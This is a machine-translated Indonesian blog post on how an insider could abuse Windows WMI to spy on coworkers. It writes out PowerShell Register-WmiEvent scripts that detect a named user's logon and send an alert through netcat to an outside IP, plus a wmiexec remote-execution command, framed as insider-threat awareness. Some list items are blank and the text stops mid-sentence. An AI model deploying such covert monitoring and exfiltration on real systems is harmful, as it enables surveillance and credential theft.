<!doctype html>
<html class="no-js" lang="id">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👨🏼‍💻 👬 🔬 Panduan Instrumentasi Manajemen Windows (WMI): Memahami Serangan WMI ✍🏿 ✏️ 😛</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Windows Management Instrumentation (WMI) adalah subsistem PowerShell yang memberikan administrator akses ke alat pemantauan sistem yang kuat. Toolkit ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Panduan Instrumentasi Manajemen Windows (WMI): Memahami Serangan WMI</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/varonis/blog/507068/"><img src="https://habrastorage.org/webt/wm/nj/qv/wmnjqvqbgcfcfxcp3omsbeuk4xi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Windows Management Instrumentation (WMI) adalah subsistem PowerShell yang memberikan administrator akses ke alat pemantauan sistem yang kuat. Toolkit ini disusun sebagai alat administrasi sistem yang cepat dan efektif, tetapi tidak semua orang menggunakannya untuk tujuan yang baik: dengan bantuannya, orang dalam dapat memata-matai karyawan lain. Mengetahui kerentanan WMI ini membuatnya lebih mudah untuk mendeteksi dan memerangi ancaman internal. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pada artikel ini, kita akan memeriksa apa alat WMI, mengapa mereka diperlukan, dan bagaimana mereka dapat digunakan untuk melacak aktivitas orang dalam dalam sistem. Kami juga telah menyusun panduan yang lebih rinci tentang acara WMI dan spionase orang dalam, yang dapat Anda </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">unduh secara gratis.</font></font></a><br>
<a name="habracut"></a><br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Ulasan singkat: untuk apa WMI dan untuk apa?</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/0t/au/hp/0tauhpqfa_9fk8xebbdasj4e3je.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami memberikan contoh nyata. </font><font style="vertical-align: inherit;">Menggunakan WMI, Anda dapat meminta, misalnya, semua file Excel besar yang terletak di direktori tertentu, dan kemudian menerima pemberitahuan setiap kali Anda membuat file dengan ukuran tertentu, misalnya 1 MB. </font><font style="vertical-align: inherit;">The </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Register-WmiEvent cmdlet</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> memungkinkan </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;">Anda</font></a><font style="vertical-align: inherit;"> untuk melakukan semua ini dengan tunggal, garis tidak terlalu rumit dalam PowerShell. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Di tangan yang baik, WMI dapat melayani banyak tujuan yang baik, tetapi juga dapat menjadi alat untuk aktivitas orang dalam yang berbahaya. </font><font style="vertical-align: inherit;">Anda dapat dengan mudah membayangkan bagaimana seseorang dengan kebiasaan Edward Snowden menggunakan WMI untuk memata-matai rekan-rekannya. </font><font style="vertical-align: inherit;">Untuk melakukan ini, ia bahkan tidak memerlukan pengetahuan teknis khusus.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Misalkan orang dalam hipotetis kita "secara tidak sengaja" memata-matai rekannya Lex secara berkala mengunduh file Excel besar yang berisi nomor jaminan sosial dan data pribadi klien lainnya. </font><font style="vertical-align: inherit;">Dalam hal ini, orang dalam kita yang tidak mencolok dapat membangun sesuatu seperti ini:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WmiEvent -Query "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance isa 'CIM_DataFile' and TargetInstance.FileSize &gt; 2000000 and TargetInstance.Path = '\\Users\\lex\\Important' and targetInstance.Drive = 'C:’ and targetInstance.Extension =’xlsx’” -Action $action </code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kode ini </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">menanyakan</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> objek </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;">CIM_DataFile</font></a><font style="vertical-align: inherit;"> untuk mengakses informasi tentang membuat file Excel di direktori yang ditentukan, dan kemudian memulai eksekusi blok skrip. </font><font style="vertical-align: inherit;">Menjelang akhir artikel ini, kita akan melihat lebih dekat seperti apa blok skenario ini dalam kasus orang dalam hipotetis kita.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Untuk apa Windows Management Toolkit digunakan?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sebelum kita melanjutkan untuk mengeksplorasi bagaimana WMI dapat digunakan oleh orang dalam untuk tujuan pelacakan, perlu dicatat bahwa WMI memiliki banyak kegunaan yang sah. </font><font style="vertical-align: inherit;">Tujuan global dari sistem ini adalah untuk menyatukan semua kontrol untuk perangkat dan aplikasi dalam jaringan perusahaan. </font><font style="vertical-align: inherit;">Dengan demikian, WMI dapat digunakan:</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> untuk mengumpulkan informasi tentang status sistem komputer lokal dan jarak jauh </font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pengaturan keamanan untuk komputer dan aplikasi jarak jauh</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pengaturan dan pengeditan properti sistem</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pengaturan dan pengeditan izin untuk pengguna dan grup resmi</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">eksekusi kode dan serialisasi objek ( </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">semacam "SSH on steroid"</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tetapkan dan edit label drive</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">membuat jadwal proses</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">repositori objek cadangan</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aktifkan dan nonaktifkan logging kesalahan</font></font></li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Semua fitur ini dapat diakses menggunakan PowerShell dan WMIC, antarmuka baris perintah WMI. </font><font style="vertical-align: inherit;">Seperti yang Anda lihat, WMI memiliki beragam aplikasi, dan sistem ini memungkinkan Anda melacak dan mengedit berbagai parameter di jaringan komputer.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Arsitektur Instrumentasi Manajemen Windows</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/2w/tf/ij/2wtfijgpvxpx9nijaapuk9a74gg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMI toolkit adalah bagian dari sistem operasi Windows, dan sudah diinstal pada semua sistem operasi yang dimulai dengan Windows 2000. WMI terdiri dari komponen-komponen berikut:</font></font><br>
<br>
<ul>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Layanan WMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> adalah implementasi dari sistem WMI pada Windows. </font><font style="vertical-align: inherit;">Proses ini muncul dengan nama "Instrumentasi Manajemen Windows" dan merupakan tautan antara penyedia WMI, repositori WMI, dan aplikasi manajemen. </font><font style="vertical-align: inherit;">Proses ini dimulai secara otomatis ketika Anda menyalakan komputer.</font></font></li>
<li><strong> </strong> —        ,      WMI.        ,  WMI        ,       Windows,    .</li>
<li><strong> WMI </strong> —  ,       .      WMI   ,      .        Windows.</li>
<li><strong> </strong>  WMI     WMI.      ,     .   WMI       .</li>
<li><strong></strong>,     ,         . ,           .              .</li>
<li><strong> WMI</strong> —   ,      ,   WMI.      .         WMI.</li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Manajer objek CMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> adalah sistem yang duduk antara aplikasi manajemen dan penyedia WMI. </font><font style="vertical-align: inherit;">Dia meminta data dari penyedia ini dan kemudian mentransfernya ke aplikasi.</font></font></li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">API WMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> melakukan operasi ini dan menyediakan aplikasi dengan akses ke infrastruktur WMI tanpa terikat dengan jenis perangkat yang digunakan.</font></font></li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Konsumen WMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> adalah entitas yang mengirim permintaan ke objek melalui manajer objek. </font><font style="vertical-align: inherit;">Biasanya, konsumen WMI adalah aplikasi pemantauan, seperti PRTG Network Monitor, menjalankan aplikasi atau skrip PowerShell.</font></font></li>
</ul><br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Membuat Permintaan WMI</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cara termudah untuk menjalankan permintaan WMI adalah menjalankan WMIC pada baris perintah Windows standar. </font><font style="vertical-align: inherit;">Ikuti langkah-langkah ini untuk mendapatkan informasi tentang prosesor yang digunakan pada komputer lokal:</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Buka command prompt</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ketik WMIC untuk menjalankan program dan tekan Enter </font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jendela prompt perintah WMIC akan muncul.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Pada prompt perintah, Anda dapat menjalankan permintaan WMI. </font><font style="vertical-align: inherit;">Permintaan paling sederhana adalah untuk melihat informasi tentang prosesor lokal, yang dapat dilakukan menggunakan perintah berikut:</font></font><br>
<pre><code class="plaintext hljs">WMIC CPU</code></pre><br>
</li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hasil akan ditampilkan pada baris perintah.</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Hampir semua perintah yang akan dibahas di bawah ini dijalankan dengan cara ini. </font><font style="vertical-align: inherit;">Namun, WMI memungkinkan Anda menerima informasi yang jauh lebih terperinci daripada informasi prosesor, termasuk dari komputer dan aplikasi jarak jauh.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Lokakarya tentang cara menggunakan acara WMI untuk memonitor suatu sistem</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pada bagian ini, kita akan melihat bagaimana menggunakan WMI untuk menjalankan perintah dan memantau proses pada komputer jarak jauh. </font><font style="vertical-align: inherit;">Teknik tersebut dapat digunakan sebagai bagian </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dari sistem analisis perilaku pengguna dan entitas (UEBA)</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> untuk secara otomatis memantau proses di seluruh sistem dan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">memeriksa ancaman orang dalam</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , yang dibuktikan dengan perilaku mencurigakan atau peristiwa abnormal.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Menggunakan fungsionalitas wmiexec dari Impacket</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Di WMI, Anda dapat melakukan berbagai fungsi selain manajemen acara. Di dalamnya, Anda dapat memulai proses dan menjalankan perintah di Windows windows pada komputer lokal dan remote. Untuk bersenang-senang, cobalah memasukkan perintah </font><font style="vertical-align: inherit;">proses </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmic,</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> buat perintah 'notepad.exe' dalam sesi PowerShell untuk membuka editor teks Microsoft yang lama. Ia menggunakan alat baris perintah wmic yang luar biasa yang disertakan dengan WMI. Bagus kan? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jika saya menambahkan opsi / Node:, dan kemudian nama komputer Windows jarak jauh, saya bisa menjalankan Notepad di atasnya, asalkan saya memiliki izin yang sesuai. Jelas bahwa pada tingkat praktis, wmic adalah alat yang sangat diperlukan untuk administrator sistem.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sebelum Anda mulai membenci: Saya tahu bahwa ada </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmdlet PowerShell yang</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> setara </font><font style="vertical-align: inherit;">. Namun, saya menemukan sintaks wmic lebih mudah diingat. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Akan lebih bagus jika saya bisa menggunakan WMI untuk membuat pseudo-shell yang sederhana dan tidak terlihat.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/gu/nl/1j/gunl1jzoplcyeo2axlgjwd6bifw.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Pseudo-shell tersembunyi yang dibuat dengan wmiexec. </font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Untungnya, ini bisa dilakukan di Impacket. Di lingkungan pengujian Amazon, saya menggunakan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmiexec</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> favorit saya </font><font style="vertical-align: inherit;">untuk mengakses WMI melalui mesin virtual Linux. Wmiexec menyediakan kemampuan untuk membuat pseudo-shell: setiap kali sebuah perintah dimasukkan di sisi klien, sebuah shell terpisah dibuat di komputer target untuk menjalankan perintah ini. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baik psexec dan smbexec menggunakan layanan Windows untuk menjalankan perintah pada sistem jarak jauh. Smbexec berjalan diam-diam, karena ia dengan cepat membuat dan kemudian menghapus layanan, dan sebaliknya, meninggalkannya di hadapan.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/vk/mb/ik/vkmbiktrjf4cn49ihyxvhp12u0w.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Alat wmiexec secara langsung menjalankan cmd.exe untuk menjalankan perintah dari jarak jauh. </font><font style="vertical-align: inherit;">Perintah yang dibuat dapat ditemukan di penampil acara. </font><font style="vertical-align: inherit;">Perhatikan bahwa kami telah menghindari layanan Windows yang </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
menarik </font><font style="vertical-align: inherit;">perhatian. </font><font style="vertical-align: inherit;">Alat wmiexec tidak mempengaruhi layanan sama sekali, melainkan menggunakan fitur WMI yang dijelaskan di atas untuk memulai proses secara langsung. </font><font style="vertical-align: inherit;">Saat mencari kemungkinan sumber ancaman, pakar keamanan jarang memulai dengan WMI, sementara layanan biasanya merupakan tempat yang baik untuk mulai mencari bukti serangan. </font><font style="vertical-align: inherit;">Langkah bagus, wmiexec!</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Menggunakan Acara WMI untuk Memantau Pengguna</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sementara saya menghibur diri dengan pemikiran bahwa saya sangat pintar dan melakukan percobaan dengan WMI, ternyata orang-orang yang terlibat dalam tes penetrasi telah lama memahami bagaimana semuanya bekerja. Anda harus membaca </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">presentasi</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Matt Graeber yang </font><font style="vertical-align: inherit;">menakjubkan </font><font style="vertical-align: inherit;">dari konferensi Black Hat 2015, di mana ia berbicara tentang bagaimana penyerang dapat mengubah WMI dan seluruh arsenal acara menjadi alat peretasan. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dalam cerita saya, saya membayangkan orang dalam a la Snowden yang memiliki pengetahuan teknis, tetapi tidak memiliki kebijaksanaan peretasan yang dalam, dan yang dipercaya oleh karyawan lain. Orang ini tidak perlu tahu segalanya tentang WMI. Dia hanya perlu tahu apa yang diperlukan untuk bekerja pada komputer jarak jauh dan memicu kejadian.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Selain file objek, ada kelas objek lain yang menarik yang dapat dipelajari menggunakan WMI, </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">win32_LogOnSession</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Meminta objek Windows dasar ini memungkinkan Anda menemukan pengguna yang saat ini ada di sistem. Anda kemudian dapat menggunakan blok skrip tindakan Register-WmiEvent untuk menjalankan skrip PowerShell ketika pengguna baru logon dari jarak jauh. Punya intinya? Seorang penyerang dapat menerima notifikasi setiap kali pengguna yang ia pantau log ke sistem target. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Inilah yang saya sketsa:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" –Action $action</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pertanyaan selanjutnya adalah bagaimana memprogram eksekusi blok skrip. Orang dalam misterius dari fantasiku tertarik pada pengguna tertentu - Cruell. Penjahat kami perlahan memata-matai Cruella dan sekarang berencana untuk menggunakan informasi yang dikumpulkan untuk memecahkan akun kerjanya. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tugas blok skrip adalah untuk memeriksa siapa yang masuk dan menentukan apakah itu Cruella. Saya menulis beberapa baris kode PowerShell untuk tujuan ini, tetapi ini jelas bukan cara terbaik. Saya tidak menggunakan informasi acara yang dikirimkan ke blok skrip, yaitu informasi tentang pengguna baru. Saya mengalami hambatan, alasan yang saya tidak bisa mengerti saat ini. Ini membutuhkan lebih banyak pengetahuan teknis daripada yang dimiliki atau siap diperoleh oleh orang dalam yang hipotetis.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sebagai gantinya, saya hanya memeriksa daftar pengguna yang dikembalikan oleh gwmi Win32_Process (coba jalankan cmdlet ini dalam sesi PowerShell) dan cocokkan dengan parameter Cruell. </font><font style="vertical-align: inherit;">Anda dapat mengagumi keputusan terakhir saya:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" -Action {<font></font>
<font></font>
$names=gwmi Win32_Process|% { $_.GetOwner().User}<font></font>
foreach ($user in $names){<font></font>
<font></font>
    if ($user -eq "cruella") {<font></font>
<font></font>
        echo "cruella logged in"| C:\Users\lex\Documents\nc.exe 172.31.19.75 80<font></font>
    }<font></font>
}<font></font>
<font></font>
<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Register-WmiEvent memungkinkan Anda untuk menjaga stealth, karena itu hanya dimulai ketika Anda masuk lagi, alih-alih secara teratur meminta objek Win32_Process, yang bisa sangat terlihat. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ingatlah bahwa orang dalam kita berusaha untuk tidak menarik perhatian. </font><font style="vertical-align: inherit;">Ia memiliki akses ke sistem jarak jauh melalui psexec, smbexec, atau wmiexec (cara yang paling tidak mencolok). </font><font style="vertical-align: inherit;">Namun, dia tidak perlu terus-menerus berkeliaran di sekitar sistem korban. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ini adalah keindahan menggunakan acara WMI. </font><font style="vertical-align: inherit;">Anda dapat menunggu notifikasi dari Register-WmiEvent, dan kemudian dengan tenang melakukan langkah Anda.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Integrasi Netcat dan WMI</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tapi bagaimana skrip membawa berita panas bahwa Cruella masuk ke komputer target? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jika Anda perhatikan bahwa saya menggunakan perintah Netcat di atas, Anda bisa memberi diri Anda nilai tambah. </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netcat</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> adalah utilitas universal dan terkenal yang memungkinkan Anda membuat koneksi (opsional untuk malware). Dengannya, Anda dapat melakukan koneksi terbalik atau hanya mengirim pesan melalui jaringan. Saya mengambil kesempatan kedua ini. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Skrip di atas mengirim pesan Netcat dalam mode siaga dan menampilkan "Cruella login." Misi selesai. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Anda dapat membayangkan bagaimana scammer kami kemudian membuang hash dengan alat </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Secpackdump Impacket</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, pecahkan hash kredensial Cruella, lalu jalankan wmiexec, menggunakan izin Cruella, untuk mencari data yang lebih berharga.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/ca/en/ni/caennizhyw6u4_yuldedujkbowa.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Kode register-WmiEvent dapat dijalankan secara langsung. </font><font style="vertical-align: inherit;">Perhatikan pengenal acara yang ditampilkan</font></font><br>
 <br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Pemecahan Masalah Pemantauan WMI</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sebagai bagian dari contoh ini, saya ingin menjalankan (menggunakan wmiexec) dari jauh program yang berguna yang akan mengingatkan saya ketika pengguna tertentu, yaitu, Cruella, masuk. Setelah itu, saya bisa dengan aman mengatur ulang dan menghancurkan kredensinya. Ini akan menjadi cara yang paling tidak mencolok - akses jarak jauh dan tidak ada file. Satu-satunya masalah, menurut saya pada awalnya, adalah sifat sementara dari acara WMI. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Oleh karena itu, saya perlu melampirkan register-WMIEvent lama saya cabul (di bawah) di baris perintah PowerShell dengan parameter -noexit, yang memastikan bahwa sesi PowerShell disimpan setelah Register-Event, dan karena itu acara tersebut disimpan.</font></font><br>
<br>
<pre><code class="plaintext hljs"> Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" -Action {$names=gwmi Win32_Process|% { $_.GetOwner().User};foreach ($user in $names){if ($user -eq "cruella") {echo "cruella logged in"| C:\Users\lex\Documents\nc.exe 172.31.19.75 80}}}
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ketika saya mulai mengerjakan ini, saya menyadari bahwa saya harus "mengubah" karakter khusus seperti $, "dan |, dan meneruskannya sebagai literal langsung ke PowerShell. </font><font style="vertical-align: inherit;">Sakit kepala lain: Saya akhirnya harus meninggalkan penggunaan garis vertikal karena mereka menyebabkan kesalahan analisis. </font><font style="vertical-align: inherit;">Jangan tanya. </font><font style="vertical-align: inherit;">Secara bertahap, saya sampai pada baris kode yang panjang ini:</font></font><br>
<br>
<pre><code class="plaintext hljs">$command="powershell -noexit -C Register-WMIEvent -Query ""Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3"" -Action {`$names = gwmi Win32_Process; `$users=@(); foreach (`$n in `$names) {`$users += `$n.GetOwner().User}; foreach (`$u in `$users) {if (`$u -eq ""cruella"") {.\wmiexec C:\Users\lex\Documents\nc.exe 172.31.18.92 80 }}}<font></font>
.\wmiexec.exe corp.acme/lex@172.31.46.115 "$command"<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Itu tampak menjanjikan dan tampaknya berfungsi dengan benar sesuai dengan log peristiwa Windows di sistem target. </font><font style="vertical-align: inherit;">Namun, melihat lebih dekat, saya menyadari bahwa itu tidak berhasil. </font><font style="vertical-align: inherit;">Saya yakin pada akhirnya saya bisa membawanya ke bentuk yang tepat, tetapi untuk ini saya akan membutuhkan waktu dan kopi, banyak kopi. </font><font style="vertical-align: inherit;">Ada opsi lain, sedikit kurang mencolok dan sama sekali tidak fileless: Anda dapat menggunakan smbclient untuk mentransfer skrip, dan kemudian menjalankannya langsung di komputer target.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/qo/vq/jc/qovqjcy0lqzkf5v3bvaxglub5eu.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Secara jarak jauh menjalankan cmdlet Register-Event yang kompleks bagi saya tampaknya benar sekali. </font><font style="vertical-align: inherit;">Tetapi itu tidak berhasil. </font><font style="vertical-align: inherit;">Nah, </font></font><br>
 <br>
